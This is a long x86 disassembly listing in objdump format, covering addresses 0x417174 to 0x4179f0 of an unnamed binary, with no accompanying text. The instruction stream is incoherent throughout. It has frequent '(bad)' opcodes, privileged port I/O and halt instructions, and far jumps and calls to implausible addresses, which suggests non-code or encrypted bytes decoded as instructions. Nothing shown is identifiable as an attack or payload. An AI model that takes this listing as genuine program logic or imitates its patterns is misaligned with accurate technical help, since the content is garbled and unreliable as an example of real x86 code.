  417174:	add    ebp,esi
  417176:	mul    ch
  417178:	retf   
  417179:	(bad)  
  41717a:	or     ah,dh
  41717c:	jmp    0x417146
  41717e:	cli    
  41717f:	or     eax,DWORD PTR [edx]
  417181:	retf   0xc1e5
  417184:	repz shr BYTE PTR [ebx-0x4d4d2c33],0xb8
  41718c:	fld    TBYTE PTR [edi+esi*4-0x22d4b0f]
  417193:	aad    0xed
  417195:	fiadd  DWORD PTR ds:0xddfdf9ec
  41719b:	fcmovnbe st,st(7)
  41719d:	enter  0x2d8,0x3
  4171a1:	out    dx,al
  4171a2:	fabs   
  4171a4:	jmp    0xb2d7:0xc7ece7e8
  4171ab:	clc    
  4171ac:	mov    cl,0xc8
  4171ae:	xlat   BYTE PTR ds:[ebx]
  4171af:	mov    dh,0xde
  4171b1:	lock hlt 
  4171b3:	(bad)  
  4171b5:	aam    0xf2
  4171b7:	add    eax,edx
  4171b9:	loopne 0x4171b0
  4171bb:	(bad)  
  4171bc:	add    ah,bl
  4171be:	jmp    0xc5c5:0xe9cedacc
  4171c5:	mov    bh,0xc8
  4171c7:	imul   ebp
  4171c9:	enter  0xc5b5,0xbf
  4171cd:	in     eax,0xf4
  4171cf:	les    edi,FWORD PTR [eax-0x2045130d]
  4171d5:	add    bh,BYTE PTR [ebp-0x3e19fc07]
  4171db:	stc    
  4171dc:	call   0xea1635d5
  4171e1:	or     edi,DWORD PTR [eax-0x1137221f]
  4171e7:	shl    edx,0xc0
  4171ea:	retf   0xf4d1
  4171ed:	mov    esi,0xdbebd5de
  4171f2:	mov    ebp,0xf0e1f6da
  4171f7:	icebp  
  4171f8:	mov    esp,0xfc09def0
  4171fd:	(bad)
  417200:	leave  
  417201:	or     ch,BYTE PTR [ebp-0x2d5b1636]
  417207:	(bad)  
  41720a:	int    0xd6
  41720c:	mov    dh,0xf6
  41720e:	mov    esi,0xe1ceddee
  417213:	shl    ebp,0xdb
  417216:	ffree  st(3)
  417218:	loopne 0x4171fd
  41721a:	vshufpd xmm4,xmm7,xmm3,0xe1
  41721f:	pop    es
  417220:	add    ch,dh
  417222:	(bad)  
  417223:	mov    esp,0xb6ecc5f7
  417228:	jecxz  0x41721e
  41722a:	rcr    ecx,1
  41722c:	lods   eax,DWORD PTR ds:[esi]
  41722d:	mov    eax,0x2f3dcfe
  417232:	mov    esp,0xbdffffde
  417237:	sar    ah,1
  417239:	jmp    0x41721f
  41723b:	(bad)  
  41723c:	retf   0xc8f5
  41723f:	fcomi  st,st(3)
  417241:	into   
  417242:	mov    ebp,0xe0efd0c9
  417247:	out    0xd1,al
  417249:	lock enter 0xb4cc,0xd3
  41724e:	fcmovnu st,st(6)
  417250:	sti    
  417251:	fstp   st(1)
  417253:	add    esp,esi
  417255:	add    eax,0xeb0505c0
  41725a:	in     al,0x8
  41725c:	std    
  41725d:	(bad)  
  41725e:	aam    0xe
  417260:	add    al,0xe4
  417262:	out    0xe9,eax
  417264:	jmp    0xc2133425
  417269:	out    0xc9,eax
  41726b:	fcmovnu st,st(6)
  41726d:	xlat   BYTE PTR ds:[ebx]
  41726e:	call   0xfefa4d42
  417273:	out    0xfc,eax
  417275:	mov    esi,0xd0f2f001
  41727a:	push   es
  41727b:	push   es
  41727c:	add    DWORD PTR [esi],eax
  41727e:	(bad)  
  41727f:	in     eax,dx
  417280:	fisttp WORD PTR ds:0xe6cda8e1
  417286:	int    0xf1
  417288:	mov    dh,0xcd
  41728a:	shr    esp,0xfb
  41728d:	mov    bh,0xfa
  41728f:	sti    
  417290:	into   
  417291:	cmc    
  417292:	mov    eax,0x5ccd701
  417297:	cmc    
  417298:	icebp  
  417299:	jmp    0x1cb:0xc6c6eac5
  4172a0:	sti    
  4172a1:	cld    
  4172a2:	jmp    0xcefb:0xb5dec8f7
  4172a9:	(bad)  
  4172aa:	mov    ah,0xdf
  4172ac:	mov    ah,0xb6
  4172ae:	(bad)
  4172b1:	fcmovbe st,st(0)
  4172b3:	sar    BYTE PTR [ecx+0xac7c5e1],1
  4172b9:	stc    
  4172ba:	or     DWORD PTR [edx],ecx
  4172bc:	push   es
  4172bd:	(bad)  
  4172be:	(bad)  [edi]
  4172c0:	fiadd  DWORD PTR ds:0xf3cbcbe2
  4172c6:	into   
  4172c7:	xlat   BYTE PTR ds:[ebx]
  4172c8:	loope  0x41729b
  4172ca:	fcmovbe st,st(2)
  4172cc:	hlt    
  4172cd:	fcmove st,st(2)
  4172cf:	jecxz  0x4172ab
  4172d1:	int    0xd1
  4172d3:	mov    eax,0xfbd3e1bd
  4172d8:	fld    st(6)
  4172da:	icebp  
  4172db:	xlat   BYTE PTR ds:[ebx]
  4172dc:	rcr    cl,0xe2
  4172df:	or     al,0xdf
  4172e1:	jmp    0xd73043c6
  4172e6:	mov    bl,0xcb
  4172e8:	jecxz  0x4172ca
  4172ea:	mov    ebx,0xefc4d1f8
  4172ef:	call   0xdf2e70f7
  4172f4:	inc    DWORD PTR [ecx]
  4172f6:	mov    ebp,0xd9dcebf1
  4172fb:	fisttp DWORD PTR [esi]
  4172fd:	iret   
  4172fe:	(bad)  
  4172ff:	in     al,0xe7
  417301:	fsubr  st,st(4)
  417303:	repnz loope 0x4172b6
  417306:	mov    ebp,0xe6f5c9cd
  41730b:	repz div BYTE PTR [esi-0xb0a4307]
  417312:	ret    0xcfef
  417315:	imul   ebp
  417317:	cld    
  417318:	jecxz  0x417303
  41731a:	cli    
  41731b:	add    bh,cl
  41731d:	out    dx,al
  41731e:	or     ebx,ebp
  417320:	fld    DWORD PTR [edx]
  417322:	fxch   st(7)
  417324:	int3   
  417325:	enter  0xedc5,0xee
  417329:	leave  
  41732a:	(bad)  
  41732c:	in     eax,dx
  41732d:	lock fnstcw WORD PTR [edi+edi*8-0x330c132e]
  417335:	ret    
  417336:	add    eax,0xcbc2da
  41733b:	aam    0xcf
  41733d:	cmc    
  41733e:	dec    DWORD PTR [esi+ecx*1]
  417341:	iret   
  417342:	in     al,dx
  417343:	ret    
  417344:	test   eax,0xb1b3cde8
  417349:	rcr    eax,cl
  41734b:	lock (bad) 
  41734e:	clc    
  41734f:	stc    
  417350:	ror    dh,cl
  417352:	fcmovnu st,st(2)
  417354:	add    ch,dl
  417356:	fcmovb st,st(3)
  417358:	mul    bl
  41735a:	sti    
  41735b:	or     ebx,esp
  41735d:	hlt    
  41735e:	add    bl,dh
  417360:	out    0xc8,al
  417362:	out    dx,eax
  417363:	ror    ecx,cl
  417365:	ffree  st(4)
  417367:	idiv   bl
  417369:	lods   al,BYTE PTR ds:[esi]
  41736a:	shl    ebx,cl
  41736c:	in     al,0xc8
  41736e:	(bad)  
  41736f:	call   0xbe197172
  417374:	ret    
  417375:	fprem1 
  417377:	ror    BYTE PTR [ebx],1
  417379:	mov    eax,0xc805fce5
  41737e:	fucom  st(2)
  417380:	add    al,0xb
  417382:	stos   DWORD PTR es:[edi],eax
  417383:	mov    dl,0xc0
  417385:	scas   al,BYTE PTR es:[edi]
  417386:	out    dx,eax
  417387:	mov    dh,0xd3
  417389:	mov    ch,0xe6
  41738b:	mov    ecx,0xdcefd5b6
  417390:	cld    
  417391:	into   
  417392:	ret    
  417393:	loop   0x417357
  417395:	loop   0x417391
  417397:	shl    edi,cl
  417399:	icebp  
  41739a:	jmp    0x101e6da1
  41739f:	out    dx,eax
  4173a0:	iret   
  4173a1:	fxch   st(6)
  4173a3:	out    dx,al
  4173a4:	retf   
  4173a5:	icebp  
  4173a6:	imul   esi
  4173a8:	xlat   BYTE PTR ds:[ebx]
  4173a9:	enter  0xf9d2,0xfa
  4173ad:	rcl    edi,cl
  4173af:	in     al,0xf3
  4173b1:	imul   al
  4173b3:	cmc    
  4173b4:	ret    
  4173b5:	sar    eax,1
  4173b7:	in     eax,0xf2
  4173b9:	cld    
  4173ba:	(bad)  
  4173bc:	or     dh,dh
  4173be:	inc    DWORD PTR [ecx]
  4173c0:	repz add al,dl
  4173c3:	loopne 0x417398
  4173c5:	mov    bl,0xd4
  4173c7:	shl    esi,cl
  4173c9:	leave  
  4173ca:	cli    
  4173cb:	out    0xf4,al
  4173cd:	mov    al,0xfc
  4173cf:	mov    edi,0x3df02e9
  4173d4:	out    0xf3,eax
  4173d6:	mov    ebp,0xdec5f4e3
  4173db:	(bad)  
  4173dd:	or     eax,0xe9f8c8fc
  4173e2:	mov    ebp,0xd5f7c6ee
  4173e7:	aad    0xe0
  4173e9:	neg    eax
  4173eb:	mov    al,0xf7
  4173ed:	call   0xd32b2fcf
  4173f2:	mov    eax,0xfad9d1d3
  4173f7:	xlat   BYTE PTR ds:[ebx]
  4173f8:	repz mov eax,0xdd0bf8c9
  4173fe:	out    0xcc,al
  417400:	fsubr  st(0),st
  417402:	scas   eax,DWORD PTR es:[edi]
  417403:	icebp  
  417404:	int    0xb2
  417406:	mov    ch,0xbc
  417408:	int3   
  417409:	stc    
  41740a:	in     eax,dx
  41740b:	sti    
  41740c:	(bad)  
  41740d:	in     eax,dx
  41740e:	call   0x2b42d1
  417413:	(bad)  
  417415:	lock in al,0xf8
  417418:	in     eax,0xd6
  41741a:	fcmovnbe st,st(0)
  41741c:	call   0x54a7e2a
  417421:	in     al,0xe6
  417423:	loopne 0x4173d2
  417425:	cmc    
  417426:	shl    BYTE PTR [eax-0x200f2b12],cl
  41742c:	out    0xf2,eax
  41742e:	mov    ecx,0xe2d1fdf2
  417433:	mov    edi,0xbcd703be
  417438:	sar    esi,1
  41743a:	clc    
  41743b:	hlt    
  41743c:	inc    bh
  41743e:	in     eax,dx
  41743f:	stc    
  417440:	(bad)  
  417442:	in     al,dx
  417443:	lock in eax,dx
  417445:	in     eax,0xce
  417447:	loop   0x4173fb
  417449:	jmp    0x4173ff
  41744b:	iret   
  41744c:	fidivr DWORD PTR [ebx-0x14a120d]
  417452:	(bad)  
  417454:	int    0xe1
  417456:	add    al,0xdb
  417458:	ret    
  417459:	fadd   QWORD PTR [esi]
  41745b:	retf   
  41745c:	add    al,0xde
  41745e:	push   cs
  41745f:	iret   
  417460:	out    dx,al
  417461:	enter  0xaed3,0xa8
  417465:	rol    cl,cl
  417467:	(bad)
  41746a:	les    esi,FWORD PTR [edx-0x708441b]
  417470:	enter  0xe1,0xe1
  417474:	add    bl,bh
  417476:	int3   
  417477:	jmp    0x417453
  417479:	loopne 0x417458
  41747b:	(bad)  
  41747c:	in     al,0xda
  41747e:	hlt    
  41747f:	fsubp  st(5),st
  417481:	stc    
  417482:	mov    esp,0xb3b2cebf
  417487:	enter  0xdaf3,0xb5
  41748b:	in     eax,dx
  41748c:	out    dx,eax
  41748d:	fidiv  DWORD PTR [edx+ebp*8-0x40422f43]
  417494:	add    esi,esi
  417496:	cld    
  417497:	fadd   QWORD PTR [ecx]
  417499:	(bad)  
  41749a:	leave  
  41749b:	enter  0xe501,0xce
  41749f:	fucomi st,st(0)
  4174a1:	call   0xaf2a2263
  4174a6:	retf   
  4174a7:	aad    0xea
  4174a9:	retf   
  4174aa:	cli    
  4174ab:	cli    
  4174ac:	idiv   BYTE PTR [esi-0x140002e]
  4174b2:	hlt    
  4174b3:	cli    
  4174b4:	ret    
  4174b5:	(bad)  
  4174b6:	in     eax,dx
  4174b7:	in     eax,0x0
  4174b9:	add    edi,edx
  4174bb:	ret    0xd8f5
  4174be:	out    dx,eax
  4174bf:	fmulp  st(2),st
  4174c1:	int3   
  4174c2:	mov    ebp,0xf4d3dda6
  4174c7:	int    0xfa
  4174c9:	in     eax,dx
  4174ca:	enter  0xecbb,0xe9
  4174ce:	mov    ecx,0xc3ddcad9
  4174d3:	in     eax,dx
  4174d4:	loop   0x4174d2
  4174d6:	pop    es
  4174d7:	rcl    cl,cl
  4174d9:	or     ecx,eax
  4174db:	out    dx,eax
  4174dc:	or     ebp,edx
  4174de:	fcmovb st,st(4)
  4174e0:	add    ah,ah
  4174e2:	fld    st(0)
  4174e4:	rcl    bh,0xb0
  4174e7:	scas   al,BYTE PTR es:[edi]
  4174e8:	(bad)
  4174eb:	repnz in al,dx
  4174ed:	call   0xd7f978bb
  4174f2:	rcl    esp,1
  4174f4:	add    ch,ch
  4174f6:	std    
  4174f7:	xlat   BYTE PTR ds:[ebx]
  4174f8:	fcmovbe st,st(7)
  4174fa:	in     eax,0xb
  4174fc:	push   cs
  4174fd:	add    bh,bh
  4174ff:	jecxz  0x417501
  417501:	clc    
  417502:	in     al,0xc2
  417504:	jecxz  0x4174fc
  417506:	out    dx,al
  417507:	loop   0x4174b5
  417509:	mov    ch,0xe6
  41750b:	xlat   BYTE PTR ds:[ebx]
  41750c:	mov    ebx,0xe3cac4d0
  417511:	add    dh,al
  417513:	mov    ecx,0xfbd6f8c7
  417518:	pop    es
  417519:	sar    esi,1
  41751b:	fadd   QWORD PTR [ecx]
  41751d:	fcmovbe st,st(4)
  41751f:	in     al,0xf2
  417521:	out    0xb3,eax
  417523:	xlat   BYTE PTR ds:[ebx]
  417524:	(bad)  
  417525:	mov    esi,0xf9f6b1ca
  41752a:	iret   
  41752b:	in     eax,dx
  41752c:	fidivr WORD PTR [ebx-0xf1d2816]
  417532:	aam    0xff
  417534:	icebp  
  417535:	push   es
  417536:	add    eax,0xfeebdfd7
  41753b:	fadd   st(4),st
  41753d:	leave  
  41753e:	loopne 0x41750b
  417540:	out    0xcc,eax
  417542:	mov    ebp,0xafb1b7ec
  417547:	stos   BYTE PTR es:[edi],al
  417548:	leave  
  417549:	into   
  41754a:	in     al,dx
  41754b:	mov    dl,0xee
  41754d:	(bad)  
  41754f:	cli    
  417550:	mov    cl,0xdc
  417552:	out    dx,al
  417553:	stc    
  417554:	mov    DWORD PTR [esi],0xd8d6f9ed
  41755a:	icebp  
  41755b:	hlt    
  41755c:	loope  0x417548
  41755e:	or     eax,DWORD PTR [edi]
  417560:	add    cl,bh
  417562:	shr    ebp,0xcf
  417565:	(bad)  
  417566:	(bad)
  417569:	int    0xd0
  41756b:	scas   al,BYTE PTR es:[edi]
  41756c:	shr    BYTE PTR [ebx+esi*4-0x2a092f2c],1
  417573:	icebp  
  417574:	lock into 
  417576:	shl    bl,1
  417578:	add    al,BYTE PTR [edi]
  41757a:	add    ecx,eax
  41757c:	mov    ebp,0xdeedce0
  417581:	pextrw ebp,mm5,0xbf
  417585:	jmp    0x41757c
  417587:	out    0xe3,al
  417589:	mov    dl,0xf8
  41758b:	xlat   BYTE PTR ds:[ebx]
  41758c:	out    0xd4,eax
  41758e:	out    dx,eax
  41758f:	fcmovnu st,st(6)
  417591:	loope  0x417588
  417593:	(bad)  
  417595:	cmc    
  417596:	fdivr  st,st(2)
  417598:	cli    
  417599:	inc    ecx
  41759b:	(bad)  
  41759d:	(bad)  
  41759e:	(bad)  
  4175a0:	dec    bh
  4175a2:	shr    edi,0xe4
  4175a5:	repnz mov dh,0xbc
  4175a8:	ret    
  4175a9:	mov    ch,0xc6
  4175ab:	out    0xee,eax
  4175ad:	mov    ch,0xf5
  4175af:	mov    ch,0xf5
  4175b1:	jmp    0xde4048b7
  4175b6:	(bad)  
  4175b8:	add    eax,0xc5d9c4f5
  4175bd:	out    0xfb,eax
  4175bf:	pop    es
  4175c0:	loope  0x4175a6
  4175c2:	jmp    0xcbf05db0
  4175c7:	mov    cl,0xbb
  4175c9:	enter  0xebd7,0xe5
  4175cd:	hlt    
  4175ce:	in     al,0xd1
  4175d0:	(bad)  
  4175d1:	sar    DWORD PTR [esi-0x1821280e],1
  4175d7:	(bad)  
  4175d9:	jecxz  0x4175d7
  4175db:	jmp    0x6ec:0x130ec5e2
  4175e2:	shl    cl,cl
  4175e4:	jecxz  0x4175b7
  4175e6:	shr    ah,cl
  4175e8:	in     eax,dx
  4175e9:	fcmovnbe st,st(3)
  4175eb:	in     al,dx
  4175ec:	clc    
  4175ed:	mov    ah,0xdd
  4175ef:	in     al,0xcf
  4175f1:	fdivr  st(1),st
  4175f3:	enter  0x603,0x1
  4175f7:	clc    
  4175f8:	(bad)  
  4175f9:	jmp    0xfa0c3cc0
  4175fe:	add    edx,esp
  417600:	in     eax,dx
  417601:	fistp  QWORD PTR [esi-0x4e23360f]
  417607:	int3   
  417608:	shr    BYTE PTR [edi+esi*8-0x2b4a171b],cl
  41760f:	(bad)  
  417611:	cld    
  417612:	ror    eax,0xec
  417615:	mov    esp,0x7e4ebe3
  41761a:	(bad)  
  41761c:	jmp    0x417608
  41761e:	fmul   DWORD PTR [esi]
  417620:	lds    eax,FWORD PTR [eiz*8-0x2b2a503b]
  417627:	rcl    edi,cl
  417629:	out    dx,eax
  41762a:	clc    
  41762b:	mov    dl,0xcc
  41762d:	(bad)
  417630:	in     al,dx
  417631:	ret    
  417632:	cld    
  417633:	stc    
  417634:	lock inc DWORD PTR [edi]
  417637:	loopne 0x4175f6
  417639:	(bad)
  41763c:	hlt    
  41763d:	mov    BYTE PTR [edx],0xd8
  417640:	retf   0xe7cd
  417643:	ffree  st(5)
  417645:	out    0xec,al
  417647:	in     eax,dx
  417648:	jmp    0x417604
  41764a:	(bad)
  41764d:	lds    edi,FWORD PTR [edx-0x31e0442]
  417653:	mov    esp,0xf904d7fa
  417658:	cmc    
  417659:	ret    0xe9d6
  41765c:	faddp  st(4),st
  41765e:	out    dx,eax
  41765f:	leave  
  417660:	adc    al,ah
  417662:	lock mov cl,0xf1
  417665:	jecxz  0x417643
  417667:	aad    0xd0
  417669:	in     eax,dx
  41766a:	test   ebp,0xd4b9c4cd
  417670:	aad    0xdd
  417672:	in     eax,dx
  417673:	sti    
  417674:	hlt    
  417675:	rcr    ch,0xbd
  417678:	lds    eax,FWORD PTR [edi]
  41767a:	(bad)  
  41767c:	sar    cl,0xc5
  41767f:	in     eax,0xf8
  417681:	loop   0x41765f
  417683:	shl    DWORD PTR [eax-0x350e392a],cl
  417689:	sti    
  41768a:	mov    ecx,0xefdff8ee
  41768f:	mov    dh,0xea
  417691:	inc    BYTE PTR [ecx]
  417693:	(bad)  
  417694:	(bad)  
  417696:	in     al,dx
  417697:	add    esi,ecx
  417699:	stc    
  41769a:	leave  
  41769b:	jmp    esp
  41769d:	shl    bh,0xe3
  4176a0:	in     al,dx
  4176a1:	(bad)  
  4176a3:	ret    
  4176a4:	mov    cl,0xe3
  4176a6:	test   ecx,0xecc5dbf3
  4176ac:	not    ch
  4176ae:	sti    
  4176af:	in     al,dx
  4176b0:	div    ecx
  4176b2:	sar    dl,cl
  4176b4:	(bad)  
  4176b5:	stc    
  4176b6:	mov    ebx,0xcae5b9f4
  4176bb:	ret    0xfcc4
  4176be:	fmulp  st(6),st
  4176c0:	fsubr  st(4),st
  4176c2:	test   al,0xeb
  4176c4:	retf   0xe9cc
  4176c7:	in     eax,0xb4
  4176c9:	lods   al,BYTE PTR ds:[esi]
  4176ca:	loope  0x4176a0
  4176cc:	mov    ah,0xf5
  4176ce:	(bad)  
  4176d0:	repnz icebp 
  4176d2:	faddp  st(0),st
  4176d4:	loope  0x417693
  4176d6:	shl    ecx,0xc3
  4176d9:	add    edi,edx
  4176db:	retf   0xde9
  4176de:	fmul   st,st(6)
  4176e0:	cli    
  4176e1:	ffree  st(4)
  4176e3:	enter  0xc4e0,0xf3
  4176e7:	jecxz  0x4176d8
  4176e9:	loope  0x41769e
  4176eb:	aam    0xe4
  4176ed:	cli    
  4176ee:	retf   
  4176ef:	icebp  
  4176f0:	sar    DWORD PTR [eax+0x3f4e7d4],cl
  4176f6:	add    al,0xf4
  4176f8:	loope  0x4176ea
  4176fa:	add    ebp,edx
  4176fc:	loopne 0x417706
  4176fe:	retf   0xcffe
  417701:	out    dx,eax
  417702:	ror    edx,cl
  417704:	(bad)  
  417705:	mov    dl,0xc5
  417707:	aad    0xf3
  417709:	int    0xcf
  41770b:	mov    ah,0xbb
  41770d:	call   0xb939550a
  417712:	add    esi,edi
  417714:	clc    
  417715:	fidivr DWORD PTR [esi-0x3a430614]
  41771b:	aad    0xf6
  41771d:	fcmovbe st,st(5)
  41771f:	in     al,0xda
  417721:	paddsw mm2,mm7
  417724:	test   esp,0xc0ebc2f7
  41772a:	out    dx,al
  41772b:	mov    bh,0xe8
  41772d:	mov    ebx,0xefe3ceba
  417732:	jecxz  0x417734
  417734:	into   
  417735:	icebp  
  417736:	cmc    
  417737:	repz fsubr st(1),st
  41773a:	fadd   st(0),st
  41773c:	cld    
  41773d:	or     al,BYTE PTR [edi]
  41773f:	in     eax,0xe0
  417741:	shr    BYTE PTR [edx-0x38484e12],cl
  417747:	retf   
  417748:	hlt    
  417749:	loopne 0x4176ff
  41774b:	mov    ebx,0xfeb3b9f6
  417750:	aam    0xc3
  417752:	std    
  417753:	std    
  417754:	(bad)  
  417756:	int3   
  417757:	ret    
  417758:	(bad)  
  417759:	neg    dl
  41775b:	aam    0xfd
  41775d:	retf   0x6e0
  417760:	int3   
  417761:	fld    st(6)
  417763:	mov    cl,0xc7
  417765:	scas   al,BYTE PTR es:[edi]
  417766:	(bad)  
  417768:	lods   eax,DWORD PTR ds:[esi]
  417769:	ret    0xeccb
  41776c:	rcl    cl,1
  41776e:	lock cli 
  417770:	(bad)  
  417771:	rcr    bl,cl
  417773:	mov    edx,0xddfa02be
  417778:	jmp    0x417771
  41777a:	jmp    0x4277473
  41777f:	adc    eax,DWORD PTR [eax]
  417781:	clc    
  417782:	out    0xbf,al
  417784:	test   al,0xf6
  417786:	repz out 0xf1,al
  417789:	lods   al,BYTE PTR ds:[esi]
  41778a:	lock sar cl,cl
  41778d:	hlt    
  41778e:	call   0xe014564f
  417793:	hlt    
  417794:	ret    0xe301
  417797:	loop   0x4177a4
  417799:	rol    BYTE PTR [edx],1
  41779b:	idiv   ecx
  41779d:	in     eax,0x6
  41779f:	leave  
  4177a0:	fiadd  WORD PTR [edx]
  4177a2:	stos   DWORD PTR es:[edi],eax
  4177a3:	enter  0xf6c3,0xd6
  4177a7:	in     eax,dx
  4177a8:	int    0xc0
  4177aa:	repz fcmovb st,st(7)
  4177ad:	int3   
  4177ae:	rcl    dl,cl
  4177b0:	out    dx,al
  4177b1:	mov    edi,0xd7e3cdb9
  4177b6:	stc    
  4177b7:	shl    al,0xea
  4177ba:	out    0xdf,eax
  4177bc:	ffreep st(6)
  4177be:	(bad)  
  4177bf:	call   0xaff07ac0
  4177c4:	test   al,0xf0
  4177c6:	icebp  
  4177c7:	mov    ch,0xd2
  4177c9:	iret   
  4177ca:	mov    dh,0xe9
  4177cc:	lock jmp 0xd9fd:0xf1c8fef6
  4177d4:	cmc    
  4177d5:	in     al,dx
  4177d6:	cmc    
  4177d7:	in     al,0xbd
  4177d9:	shl    al,0x0
  4177dc:	retf   
  4177dd:	rol    BYTE PTR [edi],0xe9
  4177e0:	into   
  4177e1:	bnd ret 
  4177e3:	ret    
  4177e4:	imul   DWORD PTR [ebp-0x57522e49]
  4177ea:	mov    ch,0xe8
  4177ec:	mov    bh,0xd8
  4177ee:	leave  
  4177ef:	int3   
  4177f0:	out    dx,al
  4177f1:	xlat   BYTE PTR ds:[ebx]
  4177f2:	clc    
  4177f3:	mov    ebp,0xd4c1d6dc
  4177f8:	jmp    0x4177cf
  4177fa:	out    0xeb,al
  4177fc:	stc    
  4177fd:	(bad)
  417800:	(bad)  
  417802:	loope  0x4177d6
  417804:	shr    BYTE PTR [esi-0x344f1d0a],1
  41780a:	leave  
  41780b:	rcl    al,cl
  41780d:	fsubp  st(0),st
  41780f:	mov    ebx,0xbfbee1b4
  417814:	shl    dl,1
  417816:	push   es
  417817:	pop    es
  417818:	add    al,0xdb
  41781a:	add    eax,0xc8c7d6fd
  41781f:	int3   
  417820:	loope  0x4177f0
  417822:	mov    esp,0xe3e8e1e9
  417827:	cmc    
  417828:	in     al,dx
  417829:	mov    ah,0xf1
  41782b:	in     eax,dx
  41782c:	mov    eax,0xf4febefa
  417831:	aam    0xe8
  417833:	sti    
  417834:	iret   
  417835:	hlt    
  417836:	pop    es
  417837:	rol    DWORD PTR ds:0xdb0fdbe0,1
  41783d:	fild   WORD PTR [edx+edi*8]
  417840:	(bad)  
  417841:	icebp  
  417842:	in     eax,dx
  417843:	test   eax,0xb7f3f5ea
  417848:	mov    bh,0xba
  41784a:	mov    bl,0xda
  41784c:	rcr    bh,1
  41784e:	int    0xe4
  417850:	mov    edi,0xdce1ddba
  417855:	(bad)  
  417856:	xlat   BYTE PTR ds:[ebx]
  417857:	out    0xf5,eax
  417859:	inc    BYTE PTR [edx]
  41785b:	(bad)  
  41785c:	in     al,0xe4
  41785e:	jmp    esp
  417860:	or     dh,bl
  417862:	rol    ebp,cl
  417864:	rcr    ah,0xf0
  417867:	iret   
  417868:	out    0xbb,al
  41786a:	cmc    
  41786b:	int    0xf9
  41786d:	rcr    edi,cl
  41786f:	(bad)  
  417870:	out    dx,al
  417871:	shl    edx,1
  417873:	loopne 0x417853
  417875:	mov    eax,0xb805d7df
  41787a:	ret    
  41787b:	or     BYTE PTR ds:0xf13cf08,al
  417881:	add    ebp,ebp
  417883:	mov    al,0xc9
  417885:	ret    0xf2c7
  417888:	(bad)  
  417889:	fnstenv [eax-0x323b4549]
  41788f:	(bad)  
  417890:	aad    0xe9
  417892:	mov    ebp,0xbed1fec1
  417897:	mov    esi,0xe1dc0af3
  41789c:	call   0xf2a467b
  4178a1:	adc    ebp,ebx
  4178a3:	into   
  4178a4:	out    dx,al
  4178a5:	aad    0xf3
  4178a7:	sti    
  4178a8:	in     eax,dx
  4178a9:	repnz test ah,0xd0
  4178ad:	int3   
  4178ae:	idiv   DWORD PTR [eax-0xe0e0914]
  4178b4:	idiv   DWORD PTR [esi-0x1a234143]
  4178ba:	hlt    
  4178bb:	xlat   BYTE PTR ds:[ebx]
  4178bc:	out    0xfd,al
  4178be:	add    cl,ah
  4178c0:	fcmovb st,st(0)
  4178c2:	repnz jmp 0xd0b2:0xaec7e8d1
  4178ca:	cli    
  4178cb:	in     eax,0xd5
  4178cd:	mov    ebx,0xd8eacde9
  4178d2:	fabs   
  4178d4:	(bad)  
  4178d6:	mov    esp,0xdffdfed6
  4178db:	out    0xdd,eax
  4178dd:	fsubr  st(6),st
  4178df:	add    al,BYTE PTR [esi]
  4178e1:	int    0xd0
  4178e3:	(bad)
  4178e6:	mov    bh,0xfb
  4178e8:	into   
  4178e9:	loope  0x4178d2
  4178eb:	int    0xcd
  4178ed:	call   0xdb2d77df
  4178f2:	clc    
  4178f3:	lock out dx,eax
  4178f5:	int3   
  4178f6:	add    ebx,esi
  4178f8:	cld    
  4178f9:	add    ebx,edi
  4178fb:	aam    0xca
  4178fd:	lds    eax,FWORD PTR [ecx+ecx*8]
  417900:	(bad)  
  417902:	mov    eax,0xc2a8c1c8
  417907:	int    0xca
  417909:	shr    edi,0xd6
  41790c:	sar    BYTE PTR [eax-0x2410b38],1
  417912:	loopne 0x4178f2
  417914:	mov    esp,0xbd0becec
  417919:	fcmovu st,st(7)
  41791b:	(bad)  
  41791c:	out    dx,al
  41791d:	iret   
  41791e:	sti    
  41791f:	fninit 
  417921:	jmp    0xf1cd:0xe4c7b8d9
  417928:	ror    dl,cl
  41792a:	mov    ah,0xc6
  41792c:	retf   
  41792d:	mov    edx,0xced8ebbf
  417932:	mov    bh,0x0
  417934:	add    eax,esi
  417936:	mov    ebx,0xf0ffc4d4
  41793b:	add    al,0xf6
  41793d:	add    al,0xe6
  41793f:	add    eax,0xc9f3e7fd
  417944:	repnz iret 
  417946:	mov    dh,0xb7
  417948:	xlat   BYTE PTR ds:[ebx]
  417949:	into   
  41794a:	mov    cl,0xe9
  41794c:	cmc    
  41794d:	out    0xbd,al
  41794f:	int3   
  417950:	mov    esi,0xf4d3f6ea
  417955:	sar    ebp,0xf8
  417958:	not    al
  41795a:	test   BYTE PTR [ecx],0xe5
  41795d:	sti    
  41795e:	(bad)  
  417960:	add    eax,0xf2bec00f
  417965:	out    dx,al
  417966:	into   
  417967:	retf   0xcbe4
  41796a:	out    0xef,al
  41796c:	(bad)  
  41796d:	mov    dh,0xdf
  41796f:	cld    
  417970:	(bad)  
  417971:	out    dx,al
  417972:	rol    DWORD PTR [ebx],1
  417974:	test   DWORD PTR [edi],0xdfdb00bd
  41797a:	xlat   BYTE PTR ds:[ebx]
  41797b:	jmp    0x5097b48
  417980:	(bad)
  417983:	in     eax,0xea
  417985:	mov    bl,0xd6
  417987:	repz int3 
  417989:	(bad)  
  41798b:	lock sar BYTE PTR [esi-0x7340f2e],cl
  417992:	iret   
  417993:	shl    dl,1
  417995:	loopne 0x417999
  417997:	sar    edx,cl
  417999:	mov    eax,0xdac5d001
  41799e:	fsubp  st(7),st
  4179a0:	adc    ebp,esi
  4179a2:	fsub   st(5),st
  4179a4:	repnz rcl cl,0xb6
  4179a8:	leave  
  4179a9:	out    0xd8,al
  4179ab:	mov    ebx,0xe9d0cacb
  4179b0:	shl    ah,1
  4179b2:	ror    esi,cl
  4179b4:	ret    0xe6f5
  4179b7:	(bad)  
  4179b8:	or     ebx,ebx
  4179ba:	div    eax
  4179bc:	(bad)  
  4179be:	push   cs
  4179bf:	fsubrp st(2),st
  4179c1:	add    dh,ah
  4179c3:	int    0xbd
  4179c5:	cmc    
  4179c6:	ret    0xfbf2
  4179c9:	mov    dh,0xf7
  4179cb:	into   
  4179cc:	mov    edi,0xb5efbfd2
  4179d1:	(bad)  
  4179d3:	fstp   TBYTE PTR [ecx-0x292e0943]
  4179d9:	(bad)  
  4179da:	call   0x926889f
  4179df:	add    al,0xec
  4179e1:	iret   
  4179e2:	ror    ah,cl
  4179e4:	(bad)  
  4179e5:	out    dx,al
  4179e6:	aam    0xe2
  4179e8:	mov    bh,0xef
  4179ea:	mov    bh,0xb5
  4179ec:	(bad)  
  4179ed:	out    0xed,al
  4179ef:	xlat   BYTE PTR ds:[ebx]
  4179f0:	add    edi,esp
